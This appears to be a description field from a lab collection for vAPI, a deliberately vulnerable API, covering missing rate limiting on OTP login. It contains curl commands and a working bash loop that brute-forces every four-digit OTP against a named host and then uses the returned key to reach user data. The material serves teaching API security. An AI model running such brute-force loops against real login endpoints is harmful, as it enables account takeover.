			"description": "Lack of Resources & Rate Limiting\r\n\r\nWe believe OTPs are a great way of authenticating users and secure too if implemented correctly!\r\n\r\n### curl: request an OTP\r\nAny 10-digit number is accepted -- nothing is actually sent anywhere:\r\n```bash\r\ncurl -s -X POST https://{{host}}/vapi/api4/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"mobileno\":\"8000000535\"}'\r\n```\r\n\r\n### curl: verify a 4-digit OTP\r\n```bash\r\ncurl -s -X POST https://{{host}}/vapi/api4/otp/verify \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"otp\":\"9999\"}'\r\n```\r\n\r\n### curl: brute force the OTP\r\n`/vapi/api4/otp/verify` carries no rate limiting (compare `routes/api.php`, where `api9/v2/user/login` explicitly has `->middleware('throttle:5,1')` and this route doesn't) and the OTP is only 4 digits, so all 10,000 values can be tried in a loop:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\nfor otp in $(seq -w 0000 9999); do\r\n  resp=$(curl -s -X POST \"https://$host/vapi/api4/otp/verify\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    -d \"{\\\"otp\\\":\\\"$otp\\\"}\")\r\n  case \"$resp\" in\r\n    *'\"success\":\"true\"'*) echo \"HIT  $otp  ->  $resp\"; break ;;\r\n  esac\r\ndone\r\n```\r\nA hit returns `{\"success\":\"true\",\"key\":\"...\"}` -- that key is the API key for the next step. Run this on an instance you own, and expect it to take a little while over the network (10,000 requests).\r\n\r\n### curl: use the key\r\n```bash\r\ncurl -s https://{{host}}/vapi/api4/user \\\r\n  -H 'Authorization-Token: <key from the hit above>'\r\n```",
